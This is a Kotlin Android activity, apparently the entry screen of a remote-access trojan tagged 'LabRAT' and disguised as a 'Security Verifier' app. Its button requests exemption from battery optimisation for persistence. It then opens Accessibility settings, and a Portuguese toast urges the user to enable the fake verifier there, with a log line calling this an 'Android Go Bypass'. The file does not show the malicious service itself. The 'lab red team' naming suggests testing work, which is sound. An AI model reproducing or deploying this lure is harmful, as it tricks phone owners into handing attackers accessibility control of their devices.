package com.labredteam.devicesecurityverifier

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private val TAG = "LabRAT"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.i(TAG, "MainActivity: Iniciando")
        
        try {
            setContentView(R.layout.activity_main)
            
            val btnEnable = findViewById<Button>(R.id.btn_enable)
            btnEnable?.setOnClickListener {
                requestIgnoreBatteryOptimizations()
                abrirAcessibilidade()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao carregar layout: ${e.message}")
        }
    }

    private fun requestIgnoreBatteryOptimizations() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                Log.i(TAG, "Solicitando exclusão de otimização de bateria")
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao solicitar ignore battery: ${e.message}")
        }
    }

    private fun abrirAcessibilidade() {
        try {
            Log.i(TAG, "Abrindo configurações de Acessibilidade diretamente (Android Go Bypass)")
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            
            Toast.makeText(
                this, 
                "Ative o 'Verificador de Segurança' na lista", 
                Toast.LENGTH_LONG
            ).show()
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao abrir Acessibilidade: ${e.message}")
            Toast.makeText(this, "Erro nas configurações", Toast.LENGTH_SHORT).show()
        }
    }
}
